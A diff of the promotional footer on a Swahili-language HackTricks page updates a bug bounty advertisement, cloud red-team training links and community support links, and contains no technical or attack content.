-**Mwongozo wa tuzo ya mdudu**: **jiandikishe** kwa **Intigriti**, jukwaa la tuzo la mdudu la malipo lililoundwa na wadukuzi, kwa wadukuzi! Jiunge nasi kwenye [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata tuzo hadi **$100,000**!
+**Bug bounty tip**: **jiandikishe** kwa **Intigriti**, jukwaa la **bug bounty la kiwango cha juu lililotengenezwa na hackers, kwa hackers**! Jiunge nasi katika [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) leo, na anza kupata bounties hadi **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Njia nyingine za kusaidia HackTricks:
-
-* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
-* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
-* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
-* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
